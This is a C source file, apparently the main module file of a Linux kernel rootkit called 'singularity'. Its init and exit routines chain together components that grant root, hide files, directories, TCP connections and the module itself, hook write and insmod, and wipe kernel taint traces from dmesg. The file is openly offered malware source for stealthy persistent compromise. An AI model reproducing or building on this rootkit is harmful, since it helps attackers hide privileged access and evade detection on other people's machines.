#include "include/core.h"
#include "include/reset_tainted.h"
#include "include/become_root.h"
#include "include/hiding_directory.h"
#include "include/hiding_stat.h"
#include "include/hiding_tcp.h"
#include "include/hooking_insmod.h"
#include "include/hooks_write.h"
#include "include/clear_taint_dmesg.h"
#include "include/hiding_chdir.h"
#include "include/hiding_readlink.h"
#include "include/hide_module.h"
#include "include/open.h"

/*
You loaded the world's strongest rootkit into my heart... woman, you are so beautiful and gentle, you changed my life, I love you <3

More love and less war
*/

static int __init singularity_init(void) {
    int ret = 0;
    ret |= reset_tainted_init();
    ret |= hiding_open_init();
    ret |= become_root_init();
    ret |= hiding_directory_init();
    ret |= hiding_stat_init();
    ret |= hiding_tcp_init();
    ret |= clear_taint_dmesg_init();
    ret |= hooks_write_init();
    ret |= hiding_chdir_init();
    ret |= hiding_readlink_init();
    module_hide_current(); // optional
    return ret;
}

static void __exit singularity_exit(void) {
    clear_taint_dmesg_exit();
    hooking_insmod_exit();
    hiding_tcp_exit();
    hiding_stat_exit();
    hiding_directory_exit();
    become_root_exit();
    reset_tainted_exit();
    hooks_write_exit();
    hiding_chdir_exit();
    hiding_readlink_exit();
    hiding_open_exit();
}

module_init(singularity_init);
module_exit(singularity_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("MatheuZSecurity");
MODULE_DESCRIPTION("Rootkit Researchers: https://discord.gg/66N5ZQppU7");
